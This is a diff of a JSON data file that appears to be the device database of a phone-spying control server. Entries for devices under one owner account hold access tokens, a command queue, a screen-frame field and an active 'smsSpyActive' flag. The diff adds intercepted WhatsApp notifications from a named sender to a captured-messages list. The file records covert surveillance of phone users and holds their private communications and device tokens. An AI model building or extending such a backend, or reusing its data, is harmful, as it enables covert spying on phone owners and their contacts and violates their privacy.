@@ -17872,7 +17872,7 @@
     "deviceName": "HP-ZI-BD1C",
     "ownerUsername": "zaa",
     "token": "2a385c7db968ac58da6c9d6aec3b4cdb",
-    "lastSeen": 1777014775198,
+    "lastSeen": 1777014781114,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T07:07:55.126Z",
@@ -17904,7 +17904,7 @@
     "deviceName": "HP-AGUSGANTENG123-A19D",
     "ownerUsername": "zaa",
     "token": "27a6ee1465ae1cc380950de113af6ece",
-    "lastSeen": 1777014776790,
+    "lastSeen": 1777014779916,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T07:12:32.651Z",
@@ -17920,6 +17920,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Galip 7B",
+        "content": "‎3 pesan baru",
+        "time": "24/04 14:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777014782173
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Galip 7B",
+        "content": "‎2 pesan baru",
+        "time": "24/04 14:12",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777014777274
+      },
       {
         "appName": "WhatsApp",
         "sender": "Galip 7B",
